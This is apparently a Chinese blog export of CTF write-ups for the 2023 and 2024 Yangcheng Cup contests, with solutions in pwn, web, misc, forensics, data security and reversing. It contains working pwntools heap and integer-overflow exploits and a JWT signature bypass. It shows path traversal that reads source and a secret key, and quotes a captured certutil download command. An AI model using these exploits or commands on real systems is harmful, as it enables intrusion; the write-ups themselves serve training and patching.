Fixfrom flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_forfrom flask_sqlalchemy import SQLAlchemyimport jwtimport refrom urllib.parse import urlsplitfrom flask_weasyprint import HTML, render_pdffrom werkzeug.security import generate_password_hash, check_password_hashimport osapp = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(10)app.config[&#x27;SQLALCHEMY_DATABASE_URI&#x27;] = &#x27;sqlite:///users.db&#x27;db = SQLAlchemy(app)URL_REGEX = re.compile(    r&#x27;http(s)?://&#x27;  # http or https    r&#x27;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;)class User(db.Model):    id = db.Column(db.Integer, primary_key=True)    username = db.Column(db.String(80), unique=True, nullable=False)    password = db.Column(db.String(80), nullable=False)    is_admin = db.Column(db.Boolean, nullable=False, default=False)def create_database(app):    with app.app_context():        db.create_all()def is_valid_url(url):    if not URL_REGEX.match(url):        return False    return True@app.route(&#x27;/register&#x27;, methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])def register():    if request.method == &#x27;POST&#x27;:        try:            data = request.form            hashed_password = generate_password_hash(data[&#x27;password&#x27;])            new_user = User(username=data[&#x27;username&#x27;], password=hashed_password, is_admin=False)            db.session.add(new_user)            db.session.commit()            return render_template(&#x27;register.html&#x27;,message=&#x27;User registered successfully&#x27;)        except:            return render_template(&#x27;register.html&#x27;,message=&#x27;Register Error!&#x27;),500    else:        return render_template(&#x27;register.html&#x27;,message=&#x27;please register first!&#x27;)@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])def login():    if request.method == &#x27;POST&#x27;:        data = request.form        user = User.query.filter_by(username=data[&#x27;username&#x27;]).first()        if user and check_password_hash(user.password, data[&#x27;password&#x27;]):            access_token = jwt.encode(                &#123;&#x27;username&#x27;: user.username, &#x27;isadmin&#x27;:False&#125;, app.config[&#x27;SECRET_KEY&#x27;], algorithm=&quot;HS256&quot;)            res = make_response(redirect(url_for(&#x27;ohmypdf&#x27;)))            res.set_cookie(&#x27;access_token&#x27;,access_token)            return res, 200        else:            return render_template(&#x27;login.html&#x27;,message=&#x27;Invalid username or password&#x27;), 500    else:        return render_template(&#x27;login.html&#x27;), 200@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def ohmypdf():    access_token = request.cookies.get(&#x27;access_token&#x27;)    if not access_token:        return redirect(url_for(&quot;login&quot;))    try:        decoded_token = jwt.decode(            access_token, app.config[&#x27;SECRET_KEY&#x27;], algorithms=[&quot;HS256&quot;],options=&#123;&quot;verify_signature&quot;: False&#125;)        isadmin = decoded_token[&#x27;isadmin&#x27;]    except:        return render_template(&#x27;login.html&#x27;,message=&#x27;Invalid access token&#x27;)    if not isadmin:        return render_template(&#x27;index.html&#x27;,message=&#x27;You do not have permission to access this resource. Where is the admin?!&#x27;), 403    if request.method == &#x27;POST&#x27;:        url = request.form.get(&#x27;url&#x27;)        if is_valid_url(url):            try:                html = HTML(url=url)                pdf = html.write_pdf()                response = make_response(pdf)                response.headers[&#x27;Content-Type&#x27;] = &#x27;application/pdf&#x27;                response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=output.pdf&#x27;                return response            except Exception as e:                return f&#x27;Error generating PDF&#x27;, 500        else:            return f&#x27;Invalid URL!&#x27;    else:        return render_template(&quot;index.html&quot;), 200if __name__ == &#x27;__main__&#x27;:    create_database(app)    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)


看下代码中关于jwt的部分，可以从这部分入手
app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(10)access_token = jwt.encode(                &#123;&#x27;username&#x27;: user.username, &#x27;isadmin&#x27;:False&#125;, app.config[&#x27;SECRET_KEY&#x27;], algorithm=&quot;HS256&quot;)decoded_token = jwt.decode(            access_token, app.config[&#x27;SECRET_KEY&#x27;], algorithms=[&quot;HS256&quot;],options=&#123;&quot;verify_signature&quot;: False&#125;)isadmin = decoded_token[&#x27;isadmin&#x27;]

&#123;&quot;verify_signature&quot;: False&#125; 修改成 &#123;&quot;verify_signature&quot;: True&#125;


参考文章1参考文章2
pwn-arrary_index_bankBreak整数溢出
from pwn import *def show(ind):    p.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)    p.sendlineafter(&#x27;account?&#x27;,str(ind))    p.readuntil(&#x27;=&#x27;)    d=int(p.readline())    return ddef edit(ind,data):    p.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)    p.sendlineafter(&#x27;account?&#x27;,str(ind))    p.sendlineafter(&#x27;much?&#x27;,str(data))e=ELF(&quot;./pwn&quot;)p=process(&quot;./pwn&quot;)d=show(-1)print(hex(d))win=d-0x1426+0x1315e.address=d-0x1426d=show(-2)print(hex(d))stack=d-0x30you=e.address+0x4010ind=(you-stack)//8#print(show(ind))edit(ind,0x20)print(edit(7,win))p.interactive()

Fix修改jle指令变成jbe

JBE用于无符号数比较，JLE用于有符号数比较



pwn-easy_forceBreakhouse_of_force
from pwn import *import timecontext.log_level=&#x27;debug&#x27;def add(ind,size,data=&#x27;\n&#x27;,end=False):    p.sendlineafter(&#x27;away&#x27;,&#x27;1&#x27;)    p.sendlineafter(&#x27;index?&#x27;,str(ind))    p.sendlineafter(&#x27;want?&#x27;,str(size))    p.sendafter(&#x27;write?&#x27;,data)    if end==False:        p.readuntil(&#x27;balckbroad on &#x27;)        d=int(p.readuntil(&#x27; &#x27;),16)        return dgadget=0x6a2226puts=0x6f6a0def pwn(p):    #gadget=int(input(&quot;asdfasdf:&quot;),16)    chunk1=add(0x0,0x18,b&#x27;\x00&#x27;*0x18+b&#x27;\xff&#x27;*8)    top_chunk=chunk1+0x20    to=0x602000    chunk2=add(1,(to-top_chunk))    chunk3=add(2,0x58,b&#x27;a&#x27;*0x18+gadget.to_bytes(3,&#x27;little&#x27;),True)    print(hex(chunk2))    p.sendline(&quot;asdfasdf&quot;)    d=p.readuntil(&#x27;asdfasdf&#x27;,timeout=0.01)    if b&#x27;asdf&#x27; not in d:        return    p.interactive()    passwhile True:    try:        p=process(&#x27;./pwn&#x27;)     #   gdb.attach(p)        pwn(p)    except Exception as e:        print(e)        pass    p.close()    time.sleep(0.01)


Fix修改写入数据长度  0x30--&gt;0x10

pwn-Printf but not fmtstrBreakfrom pwn import *context.arch=&#x27;amd64&#x27;def add(ind,size):    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;Index:&#x27;,str(ind))    p.sendlineafter(b&#x27;Size:&#x27;,str(size))def free(ind):    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;,str(ind))def edit(ind,data):    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;3&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;,str(ind))    p.sendafter(b&#x27;Content: &#x27;,data)def show(ind):    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;,str(ind))libc=ELF(&quot;./pwn2lib&quot;)p=process(&#x27;./pwn2&#x27;)gdb.attach(p)add(0,0x508)add(1,0x518)add(4,0x518)add(2,0x518)add(3,0x518)# onefree(2)show(2)p.readuntil(b&#x27;Content: &#x27;)lbin=u64(p.readuntil(&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))libc.address=lbin-0x40-62*0x10-0x60-0x10-0x1f6830-0x430success(f&quot;&#123;libc.address=:x&#125;&quot;)add(4,0x600)edit(2,p64(lbin)*2+p64(0x404140)*2)free(0)add(5,0x600)show(2)p.readuntil(b&#x27;Content: &#x27;)chunk0=u64(p.readuntil(&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))success(f&quot;&#123;chunk0=:x&#125;&quot;)fc=0x4040e0add(6,0x508)payload=flat(&#123;0:[0,0x501,fc-0x18,fc-0x10],0x500:[0x500,0x520]&#125;,filler=b&#x27;\x00&#x27;)edit(0,payload)free(1)edit(0,p64(0x4040e0)*16)edit(0,p64(0x404000))edit(0,p64(0x4011d6))free(1)p.interactive()

Fix修改plt表中的free函数项，使其在执行时跳转到自己构造的指令位置，用于执行free函数并将指针数组中被释放的chunk的地址设置为NULL

]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>awdp</tag>
        <tag>2023竞赛</tag>
        <tag>羊城杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2024年“羊城杯”粤港澳大湾区网络安全大赛 wp</title>
    <url>/posts/da856207/</url>
    <content><![CDATA[[初赛] 数据安全data-analy1恢复被打乱的数据
import csvimport reimport pandas as pddata = pd.read_csv(&quot;person_data.csv&quot;, encoding=&#x27;utf-8&#x27;)y = data.to_dict(orient=&#x27;records&#x27;)d = &#123;&#x27;编号&#x27;: &#x27;&#x27;, &#x27;用户名&#x27;: &#x27;&#x27;, &#x27;密码&#x27;: &#x27;&#x27;, &#x27;姓名&#x27;: &#x27;&#x27;, &#x27;性别&#x27;: &#x27;&#x27;, &#x27;出生日期&#x27;: &#x27;&#x27;, &#x27;身份证号&#x27;: &#x27;&#x27;, &#x27;手机号码&#x27;: &#x27;&#x27;&#125;header = data.columns.values.tolist()with open(&quot;person_data_new.csv&quot;, &quot;w&quot;, encoding=&#x27;utf-8&#x27;, newline=&#x27;&#x27;) as f:    f_csv = csv.writer(f)    f_csv.writerow(header)def hanzi(data):    pattern = re.compile(r&#x27;[\u4e00-\u9fa5]&#123;2,&#125;&#x27;)    matches = pattern.findall(data)    if len(matches) &gt; 0:        return Truefor i in y:    for _, value in i.items():        if len(value) == 18 and value[0:17].isdigit():            d[&#x27;身份证号&#x27;] = value        elif len(value) == 1 and not value.isdigit():            d[&#x27;性别&#x27;] = value        elif len(value) == 8 and value.isdigit():            d[&#x27;出生日期&#x27;] = value        elif re.search(r&#x27;[a-fA-F0-9]&#123;32&#125;&#x27;, value)!=None:            d[&#x27;密码&#x27;] = value        elif hanzi(value):            d[&#x27;姓名&#x27;] = value        elif len(value) == 11 and value.isdigit():            d[&#x27;手机号码&#x27;] = value        elif value.isdigit():            d[&#x27;编号&#x27;] = value        else:            d[&#x27;用户名&#x27;] = value    with open(&quot;person_data_new.csv&quot;, &quot;a&quot;, encoding=&#x27;utf-8&#x27;, newline=&#x27;&#x27;) as f:        f_csv = csv.writer(f)        f_csv.writerow(d.values())



data-analy2与上一题类似，筛选出不符合格式的数据
先从流量包中导出数据
tshark -r data.pcapng -T fields -e http.file_data -Y &quot;http.request&quot; &gt; data.txt
# encoding: utf-8import csvimport jsonimport pandas as pdf = open(&#x27;data.txt&#x27;)e = [bytes.fromhex(i) for i in f.read().splitlines()]f.close()d = []for i in e:    if i.strip():        d.append(i)e = b&#x27;[&#x27; + b&#x27;,&#x27;.join(d) + b&#x27;]&#x27;d = json.loads(e)# l = &#123;&#x27;username&#x27;: &#x27;&#x27;, &#x27;name&#x27;: &#x27;&#x27;, &#x27;sex&#x27;: &#x27;&#x27;, &#x27;birth&#x27;: &#x27;&#x27;, &#x27;idcard&#x27;: &#x27;&#x27;, &#x27;phone&#x27;: &#x27;&#x27;&#125;import osif os.path.exists(&#x27;data.csv&#x27;):    os.remove(&#x27;data.csv&#x27;)f = open(&#x27;data.csv&#x27;, &#x27;w&#x27;, encoding=&quot;utf-8&quot;, newline=&#x27;&#x27;)f_csv = csv.writer(f)f_csv.writerow(d[0].keys())phum = [734, 735, 736, 737, 738, 739, 747, 748, 750, 751, 752, 757, 758, 759, 772, 778, 782, 783, 784, 787, 788, 795,        798, 730, 731, 732, 740, 745, 746, 755, 756, 766, 767, 771, 775, 776, 785, 786, 796, 733, 749, 753, 773, 774,        777, 780, 781, 789, 790, 791, 793, 799]def check(data):    # 将data前17位数字分别乘以不同的系数。从第⼀位到第⼗七位的系数分别是： 7, 9, 10 , 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2    # 将这17位数字和系数相乘的结果相加。    # 用加出来和除以11，得到余数    # 余数的结果对应的数字即为第18位数字。如果余数是2，那么第18位数字就是x    data = data[:-1]    data = list(map(int, data))    xi = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]    sum = 0    for i in range(17):        sum += xi[i] * int(data[i])    sum %= 11    if sum == 0:        data.append(str(1))    elif sum == 1:        data.append(str(0))    elif sum == 2:        data.append(&#x27;X&#x27;)    else:        data.append(str(12 - sum))    return data[-1]for i in d:    for key, value in i.items():        if key == &#x27;username&#x27;:            if not value.isalnum():                print(&quot;username: &quot; + str(i))                f_csv.writerow(i.values())                break        if key == &#x27;name&#x27;:            if not all(&#x27;\u4e00&#x27; &lt;= char &lt;= &#x27;\u9fa5&#x27; for char in value):                print(&quot;name: &quot; + str(i))                f_csv.writerow(i.values())                break        if key == &#x27;idcard&#x27;:            if len(value) != 18 or not value[:-1].isdigit() or value[-1] not in &#x27;0123456789X&#x27; or value[-1] != check(                    value):                print(&quot;idcard: &quot; + str(i))                f_csv.writerow(i.values())                break        if key == &#x27;sex&#x27;:            if value not in [&#x27;男&#x27;, &#x27;女&#x27;] or (value == &#x27;男&#x27; and i[&#x27;idcard&#x27;][16] not in &#x27;13579&#x27;) or (                    value == &#x27;女&#x27; and i[&#x27;idcard&#x27;][16] not in &#x27;02468&#x27;):                print(&quot;sex: &quot; + str(i))                f_csv.writerow(i.values())                break        if key == &#x27;birth&#x27;:            if len(value) != 8 or not value.isdigit() or value != i[&#x27;idcard&#x27;][6:14] or int(value[:4]) not in range(1900,                                                                                                                   2021) or int(                value[4:6]) not in range(1, 13) or int(value[6:]) not in range(1, 32):                print(&quot;birth: &quot; + str(i))                f_csv.writerow(i.values())                break        if key == &#x27;phone&#x27;:            if len(value) != 11 or not value.isdigit() or int(value[:3]) not in phum:                print(&quot;phone: &quot; + str(i))                f_csv.writerow(i.values())                break


data-analy3给了三个日志文件，只有error.log有数据
部分校验与第二题类似，多了一个脱敏
import hashlibimport refrom urllib import parse# 数据脱敏函数def check(data, flag):    # username    if flag == 1:        if len(data) == 2:            return data[0] + &#x27;*&#x27;        else:            return data[0] + &#x27;*&#x27; * (len(data) - 2) + data[-1]    # password    elif flag == 2:        return hashlib.md5(data.encode()).hexdigest()    # name    elif flag == 3:        pattern = re.compile(r&#x27;[\u4e00-\u9fa5]+&#x27;)        match = pattern.findall(data)        if len(match[0]) != len(data):            raise Exception()        if len(match[0]) == 2:            return match[0][0] + &#x27;*&#x27;        else:            return match[0][0] + &#x27;*&#x27; * (len(match[0]) - 2) + match[0][-1]    # idcard    elif flag == 4:        # 只显示年份        return &#x27;*&#x27; * 6 + data[6:10] + &#x27;*&#x27; * 8    # phone    elif flag == 5:        return data[:3] + &#x27;*&#x27; * 4 + data[-4:]# 身份证校验def sfz_check(data):    data = data[:-1]    data = list(map(int, data))    xi = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]    sum = 0    for i in range(17):        sum += xi[i] * int(data[i])    sum %= 11    if sum == 0:        data.append(str(1))    elif sum == 1:        data.append(str(0))    elif sum == 2:        data.append(&#x27;X&#x27;)    else:        data.append(str(12 - sum))    return data[-1]with open(&#x27;error.log&#x27;, &#x27;rb&#x27;) as f:    data = f.readlines()pattern = re.compile(r&#x27;username=(.*?)&amp;name=(.*?)&amp;idcard=(.*?)&amp;phone=(.+)&#x27;)pattern2 = re.compile(    r&#x27;: ([\w\d]+?)\\n&#x27;)phum = [734, 735, 736, 737, 738, 739, 747, 748, 750, 751, 752, 757, 758, 759, 772, 778, 782, 783, 784, 787, 788, 795,        798, 730, 731, 732, 740, 745, 746, 755, 756, 766, 767, 771, 775, 776, 785, 786, 796, 733, 749, 753, 773, 774,        777, 780, 781, 789, 790, 791, 793, 799]ds = []i = 0while i &lt; len(data):    match = pattern.findall(parse.unquote(data[i].decode()))    if match:        passwddata = b&#x27;&#x27;.join(data[i:i + 10]).decode()        passwd = pattern2.search(passwddata)        if passwd:            try:                if sfz_check(match[0][2]) != match[0][2][-1]:                    raise Exception()                if int(match[0][3][0:3]) not in phum:                    raise Exception()                if not match[0][0].isalnum():                    raise Exception()                d = &#123;&#x27;username&#x27;: check(match[0][0], 1), &#x27;password&#x27;: check(passwd.groups()[0], 2),                     &#x27;name&#x27;: check(match[0][1], 3), &#x27;idcard&#x27;: check(match[0][2], 4),                     &#x27;phone&#x27;: check(match[0][3], 5)&#125;                ds.append(d)            except:                pass        i += 10    i += 1# print(ds)with open(&#x27;example.csv&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:    f.write(&#x27;username,password,name,idcard,phone\n&#x27;)    for d in ds:        f.write(&#x27;,&#x27;.join(d.values()) + &#x27;\n&#x27;)


[初赛] mischiden文件名提示 60=()+().txt先rot47在rot13
得到加密脚本
import wavewith open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;) as f:    txt_data = f.read()    file_len = len(txt_data)    txt_data = file_len.to_bytes(3, byteorder=&#x27;little&#x27;) + txt_datawith wave.open(&quot;test.wav&quot;, &quot;rb&quot;) as f:    attrib = f.getparams()    wav_data = bytearray(f.readframes(-1))for index in range(len(txt_data)):    wav_data[index * 4] = txt_data[index]with wave.open(&quot;hiden.wav&quot;, &quot;wb&quot;) as f:    f.setparams(attrib)    f.writeframes(wav_data)


解密脚本
import wavewith wave.open(&quot;hiden.wav&quot;, &quot;rb&quot;) as f:    wav_data = bytearray(f.readframes(-1))txt_data = bytearray()for index in range(0, len(wav_data), 4):    txt_data.append(wav_data[index])file_len = int.from_bytes(txt_data[:3], byteorder=&#x27;little&#x27;)original_data = txt_data[3:file_len + 3]print(original_data.decode())


不一样的数据库_2纯数字暴力破解，得到压缩包密码753951
二维码画上定位符扫码得到NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU

rot13得到AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH
压缩包中的另一个文件Kee.kdbx百度可知用keepass打开，密码就是二维码解密的内容

打开后查看历史修改记录，得到一串加密字符串，和提示aes

aes的密码就是打开软件后出现的DASCTF


so much打开题目，给了一个c2hpZnQh.ad1的磁盘文件
文件尾存在额外数据：the key is: 1234567   really?
将文件名base64解码得到shift!
使用ftk的Decrypt AD1 image对附件解密，密码是1234567加上shift，即!@#$%^&amp;
解密后继续用ftk挂载到磁盘上，发现存在344个.crypto文件

同时，文件的时间只有2021/8/5 16:19和2021/8/5 16:20
对秒数进行操作
import os# 获取344个文件的时间time = [&#x27;&#x27;] * 344for j in range(344):    time[j] = os.path.getmtime(&#x27;S:\\&#x27; + str(j) + &#x27;.crypto&#x27;)# 按顺序转换成0和1key = &#x27;&#x27;for i in range(344):    if str(time[i]) == &#x27;1628151585.73009&#x27;:        key += &#x27;0&#x27;    else:        key += &#x27;1&#x27;# 344刚好可以整除8，转成字符串key = [key[i:i+8] for i in range(0, len(key), 8)]key = &#x27;&#x27;.join([chr(int(i, 2)) for i in key])print(key)

得到the_key_is_700229c053b4ebbcf1a3cc37c389c4fa
使用Encrypto对两个时间不一样的文件解密即可

拼接在一起得到flag

miaoro打开流量包筛选http流量
根据返回值的特征$$$xxxxxxxx$$$和攻击请求头中的Cookie和GWHT字段可以判断出是shiro反序列化攻击的流量
将Cookie中的内容进行枚举爆破，得到flag1 DASCTF&#123;B916CFEB-C40F-45D6-A7BC-

其中有两条请求base64解码后的命令为
echo Th15_11111111s_pP@sssssw000rd!!!&gt;pass.txtcertutil -urlcache -f &quot;http://192.168.1.3:801/secret.txt&quot;
将secret.txt的数据导出
发现结尾是036009000414030b405，写脚本逆序并反转字节
# python2f = open(&#x27;data.data&#x27;, &#x27;rb&#x27;)d = f.read()e = &quot;&quot;for i in d:    c = ord(i)    e += chr(((c &amp; 0xf) &lt;&lt; 4) + (c &gt;&gt; 4))f = open(&#x27;data.zip&#x27;, &#x27;wb&#x27;)f.write(e[::-1])

使用上面的密码解压得到flag2.jpg
画面明显被分割了，尝试修改高宽


网上找一个字母表对应后得到EBOFDELQDIAA&#125;
Check in附件压缩包中的注释base58解码得到Welcome2GZ
根据提示用wbs43open解txt隐写

解出得到一个log文件，是TLS的密钥log，导入到wireshark中

将附件txt内容转成pcapng后打开后发现上传了一个flag.gif

使用identify分析，发现gif每帧的间隔时间在3和23转换
identify -format &quot;%T, &quot; 1.gif3, 23, 3, 23, 3, 23, 3, 23, 3, 23, 3, 23, 23, 23, 23, 23, 3, 3, 23, 23, 3, 3, 3, 3, 3, 23, 23, 23, 3, 23, 23, 23, 3, 23, 3, 3, 23, 23, 23, 3, 3, 23, 3, 23, 23, 23, 23, 23, 3, 3, 23, 23, 3, 3, 3, 23, 3, 23, 3, 23, 3, 23, 3, 3

将23转成1，3转成0后转字符串
a = [3, 23, 3, 23, 3, 23, 3, 23, 3, 23, 3, 23, 23, 23, 23, 23, 3, 3, 23, 23, 3, 3, 3, 3, 3, 23, 23, 23, 3, 23, 23, 23, 3, 23, 3, 3, 23, 23, 23, 3, 3, 23, 3, 23, 23, 23, 23, 23, 3, 3, 23, 23, 3, 3, 3, 23, 3, 23, 3, 23, 3, 23, 3, 3]a = [1 if x == 23 else 0 for x in a]binary_string = &#x27;&#x27;.join(map(str, a))chars = [chr(int(binary_string[i:i+8], 2)) for i in range(0, len(binary_string), 8)]result = &#x27;&#x27;.join(chars)print(result)# U_0wN_1T





1z_misc天地玄黄，宇宙洪荒；日月盈昃，辰宿列张；万物芸芸，息息相关；是以十二岁而行二十八宿，其间奥妙，待探寻，显真章。若女可为11，可为1124......觜可为91，亦可为725......如此往复，周而复始。祈解其秘：[43,101,55,16,16,1017,28,812,824,43,55,226,101,55,55,415,1017,1027,28,28,617,824,28,812,1027,16,101,16,55,1027,1017,28,16]

结合例子和hint的图片可以得知
将数字拆成两部分
第一部分从子开始数，比如1就是子，4就是卯，10就是酉。。。。第二部分的数字表述对应星宿的位置（格子中从右往左逆时针数），比如子的1就是女，卯的3就是心

将题目给的数组转成对应的文字
心,胃,心,奎,奎,心,奎,心,胃,心,心,心,胃,心,心,胃,心,奎,奎,奎,奎,胃,奎,心,奎,奎,胃,奎,心,奎,心,奎,奎

只有三种文字，将心替换成. 胃替换成/ 奎替换成-
解摩斯得到密码E@SI1Y!

解压后看flag文件尾，符合lyra文件特征，同时hint.jpg中的天琴座也表明是lyra
bazel-bin/lyra/cli_example/decoder_main --encoded_path=flag.lyra --output_dir=./ --bitrate=3200
得到一段wav

在线语音转文本（语速有点快，可以au降速后去识别）后，得到一段社会主义编码，解码得到flag

[初赛] reversepic爆破五位十六进制得到rc4密钥
import osfrom mcrypt import *class rc4():    def toBytes(self,data):        if type(data)==str:            return data.encode()        elif type(data)==bytes:            return data        else:            raise Exception(&quot;data Type Error&quot;)    def GetKey(self,data):        k=[]        k1=[]        data_l=len(data)        for i in range(256):            k.append(i)            a=&quot;adsf&quot;            k1.append(data[i%data_l])        n=0        for i in range(256):            n=(k1[i]+n+k[i])&amp;0xff            n1=k[i]            k[i]=k[n]            k[n]=n1        return k    def Cipher(self,data):        data=self.toBytes(data)        enc=[]        k=self.Key.copy()        n=0        n1=0        tmp=0        for i in range(len(data)):            n=(n+1)&amp;0xff            n1=(n1+k[n])&amp;0xff            tmp=k[n]            k[n]=k[n1]            k[n1]=tmp            enc.append(data[i]^0x11^k[(k[n]+k[n1])%256])        return bytes(enc)    def __init__(self,key):        key=self.toBytes(key)        self.Key=self.GetKey(key)        self.__Key=key    def SetKey(self,key):        key=self.toBytes(key)        self.Key=self.GetKey(key)        self.__Key=keybase_=b&quot;0123456789abcdef&quot;data=[0x85,0x43,0x72,0x78,0x26]for i in Gendic(base_,5,True):    e=[i[1]^j for j in data]    # print(i)    # print(e)    r=rc4(bytes(i))    d=r.Cipher(bytes(e))    if d==b&#x27;\x89\x50\x4e\x47\x0d&#x27;:        print(i)        break


你这主函数保真么离散余弦变换DCT，套模板代码
import numpy as npdef idct(dct_data):    N = len(dct_data)    result = np.zeros(N)    for n in range(N):        sum_value = 0.0        for k in range(N):            cos_term = np.cos((k * 3.14159265 * (n + 0.5)) / N)            if k == 0:                sum_value += dct_data[k] * np.sqrt(1.0 / N) * cos_term            else:                sum_value += dct_data[k] * np.sqrt(2.0 / N) * cos_term        result[n] = sum_value    return resultdef decrypt_to_ascii(dct_data):    decrypted_data = idct(dct_data)    int_data = np.rint(decrypted_data).astype(int)    char_data = [chr(num) for num in int_data]    return &#x27;&#x27;.join(char_data)encrypted_data = [513.355,  -37.7986,  8.7316,  -10.7832,  -1.3097,  -20.5779,  6.98641,  -29.2989,  15.9422,  21.4138,  29.4754,  -2.77161,  -6.58794,  -4.22332,  -7.20771,  8.83506,  -4.38138,  -19.3898,  18.3453,  6.88259,  -14.7652,  14.6102,  24.7414,  -11.6222,  -9.754759999999999,  12.2424,  13.4343,  -34.9307,  -35.735,  -20.0848,  39.689,  21.879,  26.8296]decrypted_message = decrypt_to_ascii(encrypted_data)print(decrypted_message)#QNFPGS&#123;Ju0_1f_Zn1a_@aq_ShaaL_Qpg&#125;

在进行一次rot13
DASCTF&#123;Wh0_1s_Ma1n_@nd_FunnY_Dct&#125;
docCrack用微步云沙箱进行分析，可以看到 vba 宏代码，且释放了一个二进制文件

通过样本提取把最后一个释放的 temp 文件进行提取，再进行 base64 解密后，就是一个二进制文件，且加密就一处
for ( j = 0; j &lt; (int)j_strlen(argv[1]) &amp;&amp; (unsigned __int64)j &lt; 0x36; ++j )      v10[j + 64] = argv[1][j] &lt;&lt; 6;

在 vba 宏代码处，还存在一个加密
For i = 1 To Len(inflag) res = Chr(Asc(Mid(inflag, i, 1)) Xor 7) Result = Result

直接提取密文解密
v10 = list(range(54))v10[0] = 4288;v10[1] = 4480;v10[2] = 5376;v10[3] = 4352;v10[4] = 5312;v10[5] = 4160;v10[6] = 7936;v10[7] = 5184;v10[8] = 6464;v10[9] = 6528;v10[10] = 5632;v10[11] = 3456;v10[12] = 7424;v10[13] = 5632;v10[14] = 6336;v10[15] = 6528;v10[16] = 6720;v10[17] = 6144;v10[18] = 6272;v10[19] = 7488;v10[20] = 6656;v10[21] = 7296;v10[22] = 7424;v10[23] = 2432;v10[24] = 2432;v10[25] = 2432;v10[26] = 5632;v10[27] = 4416;v10[28] = 3456;v10[29] = 7168;v10[30] = 6528;v10[31] = 7488;v10[32] = 6272;v10[33] = 5632;v10[34] = 3520;v10[35] = 6208;v10[36] = 5632;v10[37] = 4736;v10[38] = 6528;v10[39] = 6400;v10[40] = 7488;v10[41] = 3520;v10[42] = 5632;v10[43] = 5184;v10[44] = 3456;v10[45] = 7488;v10[46] = 7296;v10[47] = 3200;v10[48] = 6272;v10[49] = 0x1D00;v10[50] = 0x980;v10[51] = 0x980;v10[52] = 0x980;v10[53] = 0x1E80;for i,v in enumerate(v10):    value=v;    value = chr((value &gt;&gt; 6)^7)    print(value, end=&#x27;&#x27;)

DASCTF&#123;Vba_1s_dangerous!!!_B1ware_0f_Macr0_V1ru5es!!!&#125;
[初赛] webLyrics For Youlyrics?lyrics=../app.py
任意文件读取得到源码
import osimport randomfrom config.secret_key import secret_codefrom flask import Flask, make_response, request, render_templatefrom cookie import set_cookie, cookie_check, get_cookieimport pickleapp = Flask(__name__)app.secret_key = random.randbytes(16)class UserData:    def __init__(self, username):        self.username = usernamedef Waf(data):    blacklist = [b&#x27;R&#x27;, b&#x27;secret&#x27;, b&#x27;eval&#x27;, b&#x27;file&#x27;, b&#x27;compile&#x27;, b&#x27;open&#x27;, b&#x27;os.popen&#x27;]    valid = False    for word in blacklist:        if word.lower() in data.lower():            valid = True            break    return valid@app.route(&quot;/&quot;, methods=[&#x27;GET&#x27;])def index():    return render_template(&#x27;index.html&#x27;)@app.route(&quot;/lyrics&quot;, methods=[&#x27;GET&#x27;])def lyrics():    resp = make_response()    resp.headers[&quot;Content-Type&quot;] = &#x27;text/plain; charset=UTF-8&#x27;    query = request.args.get(&quot;lyrics&quot;)    path = os.path.join(os.getcwd() + &quot;/lyrics&quot;, query)    try:        with open(path) as f:            res = f.read()    except Exception as e:        return &quot;No lyrics found&quot;    return res@app.route(&quot;/login&quot;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def login():    if request.method == &#x27;POST&#x27;:        username = request.form[&quot;username&quot;]        user = UserData(username)        res = &#123;&quot;username&quot;: user.username&#125;        return set_cookie(&quot;user&quot;, res, secret=secret_code)    return render_template(&#x27;login.html&#x27;)@app.route(&quot;/board&quot;, methods=[&#x27;GET&#x27;])def board():    invalid = cookie_check(&quot;user&quot;, secret=secret_code)    if invalid:        return &quot;Nope, invalid code get out!&quot;    data = get_cookie(&quot;user&quot;, secret=secret_code)    if isinstance(data, bytes):        a = pickle.loads(data)        data = str(data, encoding=&quot;utf-8&quot;)    if &quot;username&quot; not in data:        return render_template(&#x27;user.html&#x27;, name=&quot;guest&quot;)    if data[&quot;username&quot;] == &quot;admin&quot;:        return render_template(&#x27;admin.html&#x27;, name=data[&quot;username&quot;])    if data[&quot;username&quot;] != &quot;admin&quot;:        return render_template(&#x27;user.html&#x27;, name=data[&quot;username&quot;])if __name__ == &quot;__main__&quot;:    os.chdir(os.path.dirname(__file__))    app.run(host=&quot;0.0.0.0&quot;, port=8080)

导入了config.secret_key和cookie，通过任意文件读取再次拿到源码
secret_code = &quot;EnjoyThePlayTime123456&quot;


